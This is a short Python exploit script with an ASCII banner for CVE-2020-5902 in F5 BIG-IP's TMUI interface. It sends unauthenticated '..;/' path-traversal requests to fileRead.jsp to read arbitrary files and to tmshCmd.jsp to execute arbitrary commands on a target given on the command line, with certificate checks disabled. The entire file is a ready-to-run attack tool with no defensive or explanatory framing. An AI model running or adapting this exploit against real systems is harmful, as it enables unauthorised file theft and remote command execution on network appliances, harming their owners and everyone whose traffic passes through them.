import requests
import sys
import json
requests.packages.urllib3.disable_warnings()

banner= '''
   ______     _______     ____   ___ ____   ___       ____  ___   ___ ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|/ _ \ / _ \___ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \ (_) | | | |__) |
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \__, | |_| / __/ 
  \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/  /_/ \___/_____|

By: AJ
'''

def lfi(action):
	r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={1}'.format(target, action),verify=False,timeout=30)

	if r.status_code == 200:
		response = r.content.decode('utf-8')
		response = json.loads(response)
		print('\n' + response["output"])
	else:
		print(r)

def rce(action):
	r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command={1}'.format(target, action),verify=False,timeout=30)

	if r.status_code == 200:
		response = r.content.decode('utf-8')
		response = json.loads(response)
		print('\n' + response["output"])
	else:
		print(r)

if __name__ == "__main__":
	try:
		print(banner)

		target = sys.argv[1]
		exploit = sys.argv[2]
		action = sys.argv[3]

		print('Targeting https://{0}'.format(target))
		print('Attack Type: {0}'.format(exploit))
		print('Trying to execute/retrieve: {0}'.format(action))

		if exploit.lower() == "lfi":
			lfi(action)
		elif exploit.lower() == "rce":
			rce(action)
		else:
			print('Kindly specify exploit type: LFI or RCE.')

	except Exception as e:
		print(e)
		print('usage: CVE-2020-5902.py <TARGET> <EXPLOIT> <ACTION>')

	except KeyboardInterrupt:
		exit('\nCTRL + C detected ... exiting')
